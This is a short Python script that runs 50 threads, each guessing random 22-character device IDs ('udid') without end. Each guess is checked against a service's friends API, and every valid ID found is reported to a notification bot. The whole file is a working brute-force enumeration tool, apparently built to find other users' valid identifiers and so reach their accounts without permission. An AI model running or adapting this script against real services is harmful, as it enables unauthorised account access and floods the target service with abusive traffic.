import api
import string
import random
import threading
import info_bot

def get_udid():
    udid = ""
    letters = string.ascii_letters + "0123456789"
    udid += "".join(random.choice(letters) for i in range(22))
    return udid


def check():
    while True:
        udid = get_udid()
        print(udid)
        res = api.friends(udid)
        if (res != "ERROR"):
            info_bot.send_notify_udid_found(udid)


for i in range(50):
    thr = threading.Thread(target=check)
    thr.start()